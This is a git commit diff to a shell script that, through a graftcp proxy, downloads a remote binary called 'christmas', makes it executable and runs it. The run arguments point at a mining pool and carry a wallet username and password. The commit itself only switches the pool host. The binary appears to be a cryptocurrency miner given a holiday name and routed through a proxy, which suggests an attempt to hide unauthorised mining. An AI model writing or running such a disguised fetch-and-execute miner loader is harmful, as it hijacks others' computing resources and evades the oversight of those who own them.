9fce4246d72272bdd2f0c418f530849b9fb4ef9c
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-05 10:44:11 +0200

    Update start_Xmas_Test_tar_ws8.sh

--- start_Xmas_Test_tar_ws8.sh
+++ start_Xmas_Test_tar_ws8.sh
@@ -24,4 +24,4 @@ echo " "
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/christmas
 chmod +x christmas
 
-./graftcp/graftcp ./christmas -a gr -o raptorna.011data.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.Circle -p IhatePopUps
+./graftcp/graftcp ./christmas -a gr -o raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.Circle -p IhatePopUps
